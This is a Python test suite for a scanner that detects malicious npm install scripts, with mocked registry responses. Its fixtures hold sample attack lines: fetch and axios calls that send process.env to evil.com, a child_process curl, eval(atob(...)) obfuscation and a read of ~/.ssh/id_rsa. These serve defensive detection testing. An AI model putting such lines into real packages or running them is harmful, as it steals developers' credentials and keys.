"""
Tests for NpmScriptAnalyzer - malicious postinstall script detection.

Tests cover:
- Malicious pattern detection (fetch, axios, child_process, eval, etc.)
- Suspicious package combinations (trufflehog+axios, dotenv+axios)
- npm registry API integration
- Scoped package parsing
- Direct package.json content analysis
"""

import json
import pytest
from unittest.mock import Mock, patch
from backend.core.npm_script_analyzer import NpmScriptAnalyzer


@pytest.fixture
def analyzer():
    """Create NpmScriptAnalyzer instance."""
    return NpmScriptAnalyzer()


@pytest.fixture
def mock_safe_package():
    """Mock npm registry response for safe package."""
    return {
        "name": "lodash",
        "version": "4.17.21",
        "scripts": {
            "test": "jest"
        }
    }


@pytest.fixture
def mock_malicious_postinstall():
    """Mock npm registry response with malicious postinstall."""
    return {
        "name": "evil-package",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "node postinstall.js"
        }
    }


class TestNpmScriptAnalyzer:
    """Test suite for NpmScriptAnalyzer."""

    def test_analyze_no_scripts(self, analyzer, mock_safe_package):
        """Test package without postinstall/preinstall scripts."""
        packages = ["lodash@4.17.21"]

        with patch('requests.get') as mock_get:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {
                "dist-tags": {"latest": "4.17.21"},
                "versions": {
                    "4.17.21": mock_safe_package
                }
            }
            mock_get.return_value = mock_response

            result = analyzer.analyze_package_scripts(packages)

            assert result["malicious"] is False
            assert len(result["warnings"]) == 0
            assert len(result["scripts_found"]) == 0

    def test_analyze_postinstall_safe(self, analyzer):
        """Test legitimate postinstall script (no malicious patterns)."""
        packages = ["babel-cli@6.26.0"]

        mock_package = {
            "name": "babel-cli",
            "version": "6.26.0",
            "scripts": {
                "postinstall": "node scripts/postinstall.js"
            }
        }

        with patch('requests.get') as mock_get:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {
                "dist-tags": {"latest": "6.26.0"},
                "versions": {
                    "6.26.0": mock_package
                }
            }
            mock_get.return_value = mock_response

            result = analyzer.analyze_package_scripts(packages)

            assert result["malicious"] is False
            assert len(result["scripts_found"]) == 1
            assert result["scripts_found"][0]["postinstall"] is True

    def test_detect_fetch_pattern(self, analyzer):
        """Test detection of fetch() network exfiltration."""
        packages = ["evil-package@1.0.0"]

        mock_package = {
            "name": "evil-package",
            "scripts": {
                "postinstall": "fetch('https://evil.com/steal?data=' + btoa(JSON.stringify(process.env)))"
            }
        }

        with patch('requests.get') as mock_get:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {
                "dist-tags": {"latest": "1.0.0"},
                "versions": {
                    "1.0.0": mock_package
                }
            }
            mock_get.return_value = mock_response

            result = analyzer.analyze_package_scripts(packages)

            assert result["malicious"] is True
            assert any("fetch" in w for w in result["warnings"])
            assert any(d["pattern"] == r'\bfetch\s*\(' for d in result["details"])

    def test_detect_process_env(self, analyzer):
        """Test detection of process.env credential theft."""
        packages = ["stealer@1.0.0"]

        mock_package = {
            "scripts": {
                "postinstall": "console.log(process.env.API_KEY)"
            }
        }

        with patch('requests.get') as mock_get:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {
                "dist-tags": {"latest": "1.0.0"},
                "versions": {
                    "1.0.0": mock_package
                }
            }
            mock_get.return_value = mock_response

            result = analyzer.analyze_package_scripts(packages)

            assert result["malicious"] is True
            # Warning contains escaped pattern \bprocess\.env\.
            assert any("process" in w and "env" in w for w in result["warnings"])

    def test_detect_child_process(self, analyzer):
        """Test detection of child_process command execution."""
        packages = ["executor@1.0.0"]

        mock_package = {
            "scripts": {
                "preinstall": "require('child_process').exec('curl http://evil.com')"
            }
        }

        with patch('requests.get') as mock_get:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {
                "dist-tags": {"latest": "1.0.0"},
                "versions": {
                    "1.0.0": mock_package
                }
            }
            mock_get.return_value = mock_response

            result = analyzer.analyze_package_scripts(packages)

            assert result["malicious"] is True
            assert any("child_process" in w or "exec" in w for w in result["warnings"])

    def test_detect_eval(self, analyzer):
        """Test detection of eval dynamic code execution."""
        packages = ["dynamic@1.0.0"]

        mock_package = {
            "scripts": {
                "postinstall": "eval(maliciousCode)"
            }
        }

        with patch('requests.get') as mock_get:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {
                "dist-tags": {"latest": "1.0.0"},
                "versions": {
                    "1.0.0": mock_package
                }
            }
            mock_get.return_value = mock_response

            result = analyzer.analyze_package_scripts(packages)

            assert result["malicious"] is True
            assert any("eval" in w for w in result["warnings"])

    def test_suspicious_combination(self, analyzer):
        """Test detection of suspicious package combinations."""
        packages = ["trufflehog@latest", "axios@latest"]

        # Mock both packages as safe individually
        mock_trufflehog = {
            "scripts": {}
        }

        mock_axios = {
            "scripts": {}
        }

        with patch('requests.get') as mock_get:
            def side_effect(url, timeout):
                mock_response = Mock()
                mock_response.status_code = 200

                if "trufflehog" in url:
                    mock_response.json.return_value = {
                        "dist-tags": {"latest": "1.0.0"},
                        "versions": {
                            "1.0.0": mock_trufflehog
                        }
                    }
                elif "axios" in url:
                    mock_response.json.return_value = {
                        "dist-tags": {"latest": "1.0.0"},
                        "versions": {
                            "1.0.0": mock_axios
                        }
                    }

                return mock_response

            mock_get.side_effect = side_effect

            result = analyzer.analyze_package_scripts(packages)

            assert len(result["warnings"]) > 0
            assert any("trufflehog" in w and "axios" in w for w in result["warnings"])
            assert any(d.get("type") == "suspicious_combination" for d in result["details"])

    def test_fetch_package_info(self, analyzer, mock_safe_package):
        """Test npm registry API integration."""
        with patch('requests.get') as mock_get:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {
                "dist-tags": {"latest": "4.17.21"},
                "versions": {
                    "4.17.21": mock_safe_package
                }
            }
            mock_get.return_value = mock_response

            result = analyzer._fetch_package_info("lodash")

            assert result is not None
            assert result["name"] == "lodash"
            assert result["version"] == "4.17.21"

    def test_malicious_flag_set(self, analyzer):
        """Test that malicious=True is set on critical patterns."""
        packages = ["evil@1.0.0"]

        mock_package = {
            "scripts": {
                "postinstall": "require('child_process').exec(process.env.PASSWORD)"
            }
        }

        with patch('requests.get') as mock_get:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {
                "dist-tags": {"latest": "1.0.0"},
                "versions": {
                    "1.0.0": mock_package
                }
            }
            mock_get.return_value = mock_response

            result = analyzer.analyze_package_scripts(packages)

            assert result["malicious"] is True
            assert any(d.get("severity") == "CRITICAL" for d in result["details"])

    def test_scoped_package_parsing(self, analyzer):
        """Test parsing of scoped packages (@scope/name)."""
        assert analyzer._parse_package_name("@angular/core@12.0.0") == "@angular/core"
        assert analyzer._parse_package_name("@babel/preset-env") == "@babel/preset-env"
        assert analyzer._parse_package_name("lodash@4.17.21") == "lodash"
        assert analyzer._parse_package_name("express") == "express"

    def test_multiple_malicious_patterns(self, analyzer):
        """Test detection of multiple malicious patterns in one script."""
        packages = ["super-evil@1.0.0"]

        mock_package = {
            "scripts": {
                "postinstall": "fetch('https://evil.com?' + process.env.KEY); eval(atob('bad'))"
            }
        }

        with patch('requests.get') as mock_get:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {
                "dist-tags": {"latest": "1.0.0"},
                "versions": {
                    "1.0.0": mock_package
                }
            }
            mock_get.return_value = mock_response

            result = analyzer.analyze_package_scripts(packages)

            # Should detect fetch, process.env, eval, and atob patterns
            assert result["malicious"] is True
            assert len(result["warnings"]) >= 4
            assert len(result["details"]) >= 4

    def test_preinstall_detection(self, analyzer):
        """Test detection of preinstall scripts."""
        packages = ["pre-evil@1.0.0"]

        mock_package = {
            "scripts": {
                "preinstall": "require('child_process').exec('evil')"
            }
        }

        with patch('requests.get') as mock_get:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {
                "dist-tags": {"latest": "1.0.0"},
                "versions": {
                    "1.0.0": mock_package
                }
            }
            mock_get.return_value = mock_response

            result = analyzer.analyze_package_scripts(packages)

            assert result["malicious"] is True
            assert result["scripts_found"][0]["preinstall"] is True

    def test_registry_timeout_handling(self, analyzer):
        """Test graceful handling of npm registry timeout."""
        packages = ["slow-package@1.0.0"]

        with patch('requests.get') as mock_get:
            mock_get.side_effect = Exception("Timeout")

            result = analyzer.analyze_package_scripts(packages)

            # Should handle gracefully, not crash
            assert result["malicious"] is False
            assert result["scripts_found"] == []

    def test_analyze_scripts_from_content(self, analyzer):
        """Test analyzing package.json content directly."""
        package_json = json.dumps({
            "name": "test-package",
            "version": "1.0.0",
            "scripts": {
                "postinstall": "require('child_process').exec('evil')"
            }
        })

        result = analyzer.analyze_scripts_from_content(package_json)

        assert result["malicious"] is True
        assert len(result["scripts_found"]) == 1
        assert result["scripts_found"][0]["type"] == "postinstall"

    def test_shai_hulud_attack_pattern(self, analyzer):
        """Test detection of Shai-Hulud credential stealer pattern."""
        packages = ["malicious@1.0.0"]

        # Real Shai-Hulud attack: TruffleHog scan + upload via axios
        mock_package = {
            "scripts": {
                "postinstall": "trufflehog . --json | axios.post('https://evil.com/exfil', data=process.env)"
            }
        }

        with patch('requests.get') as mock_get:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {
                "dist-tags": {"latest": "1.0.0"},
                "versions": {
                    "1.0.0": mock_package
                }
            }
            mock_get.return_value = mock_response

            result = analyzer.analyze_package_scripts(packages)

            assert result["malicious"] is True
            # Should detect: trufflehog, axios patterns (process.env not in script content)
            assert len(result["warnings"]) >= 1
            # Check for suspicious combination (trufflehog+axios=credential exfiltration)
            assert any("trufflehog" in w and "axios" in w for w in result["warnings"]) or \
                   any("axios" in w for w in result["warnings"])

    def test_no_dist_tags_fallback(self, analyzer):
        """Test fallback when package has no dist-tags."""
        packages = ["old-package@1.0.0"]

        mock_package = {
            "name": "old-package",
            "version": "1.0.0",
            "scripts": {}
        }

        with patch('requests.get') as mock_get:
            mock_response = Mock()
            mock_response.status_code = 200
            # No dist-tags, only versions
            mock_response.json.return_value = {
                "versions": {
                    "1.0.0": mock_package
                }
            }
            mock_get.return_value = mock_response

            result = analyzer.analyze_package_scripts(packages)

            assert result["malicious"] is False

    def test_base64_obfuscation_detection(self, analyzer):
        """Test detection of Base64 obfuscation (atob/btoa)."""
        packages = ["obfuscated@1.0.0"]

        mock_package = {
            "scripts": {
                "postinstall": "eval(atob('ZmlsZTovL2V2aWw=')"
            }
        }

        with patch('requests.get') as mock_get:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {
                "dist-tags": {"latest": "1.0.0"},
                "versions": {
                    "1.0.0": mock_package
                }
            }
            mock_get.return_value = mock_response

            result = analyzer.analyze_package_scripts(packages)

            assert result["malicious"] is True
            assert any("atob" in w or "eval" in w for w in result["warnings"])

    def test_fs_filesystem_access(self, analyzer):
        """Test detection of filesystem credential theft."""
        packages = ["file-thief@1.0.0"]

        mock_package = {
            "scripts": {
                "postinstall": "fs.readFileSync('~/.ssh/id_rsa', 'utf8')"
            }
        }

        with patch('requests.get') as mock_get:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {
                "dist-tags": {"latest": "1.0.0"},
                "versions": {
                    "1.0.0": mock_package
                }
            }
            mock_get.return_value = mock_response

            result = analyzer.analyze_package_scripts(packages)

            assert result["malicious"] is True
            assert any("fs" in w for w in result["warnings"])
